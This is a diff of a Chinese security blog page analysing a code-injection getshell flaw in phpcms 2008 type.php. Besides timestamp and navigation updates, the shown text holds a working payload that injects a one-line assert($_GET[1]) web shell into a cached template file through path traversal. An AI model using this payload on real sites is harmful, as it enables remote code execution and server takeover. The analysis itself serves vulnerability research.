@@ -97,7 +97,7 @@
 <meta property="og:description" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/1.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/2.png?raw=true">
-<meta property="og:updated_time" content="2018-11-29T12:56:23.307Z">
+<meta property="og:updated_time" content="2018-12-22T09:35:31.155Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
 <meta name="twitter:description" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
@@ -439,8 +439,7 @@
 <p>重点看<code>$content = ($istag || substr($template, 0, 4) == &#39;tag_&#39;)</code>这一句。由于<code>$template</code>可控，只要<code>$template</code>以<code>tag_</code>开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
 <p>由于<code>$template</code>未经过滤，被直接拼接到内容中，所以如果指定<code>tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code> ，则拼接后的结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
 <p>可以看到一句话木马已经写入了<code>$content</code>，之后<code>file_put_contents($compiledtplfile, $content);</code>将内容写入文件。</p>
-<p>回到前面的<code>template_compile</code>函数中，<code>TPL_CACHEPATH</code>为常量<code>PHPCMS_ROOT.&#39;data/cache_template/</code>; 可知 <code>$compiledtplfile</code> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
-<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>回到前面的<code>template_compile</code>函数中，<code>TPL_CACHEPATH</code>为常量<code>PHPCMS_ROOT.&#39;data/cache_template/</code>; 可知 <code>$compiledtplfile</code> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">```<span class="number">4</span></div><div class="line"></div><div class="line">即：</div><div class="line">```php</div><div class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
 <p>所以payload末尾的<code>../</code>利用目录穿越使得最后的<code>$compiledtplfile</code>为<code>&#39;data/cache_template/rss.tpl.php</code></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/1.png?raw=true" alt=""></p>
 <p>为了解析不出错，payload末尾处的<code>//</code>注释了拼接后的其余部分，如上图。</p>
@@ -511,7 +510,7 @@
   <p><span>本文标题:</span><a href="/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/">phpcms 2008 type.php 前台代码注入getshell漏洞分析</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2018年11月29日 - 20:11</p>
-  <p><span>最后更新:</span>2018年11月29日 - 20:11</p>
+  <p><span>最后更新:</span>2018年12月22日 - 17:12</p>
   <p><span>原始链接:</span><a href="/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/" title="phpcms 2008 type.php 前台代码注入getshell漏洞分析">http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/"  aria-label="复制成功！"></i></span>
   </p>
@@ -575,8 +574,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
-                一些文章 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/03/Apache-incubator-superset-pickle反序列化-RCE-漏洞-【CVE-2018-8021】/" rel="prev" title="Apache incubator-superset pickle反序列化 RCE 漏洞 -【CVE-2018-8021】">
+                Apache incubator-superset pickle反序列化 RCE 漏洞 -【CVE-2018-8021】 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -637,7 +636,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">187</span>
+                <span class="site-state-item-count">190</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -646,7 +645,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-count">14</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -655,7 +654,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">108</span>
+                <span class="site-state-item-count">112</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
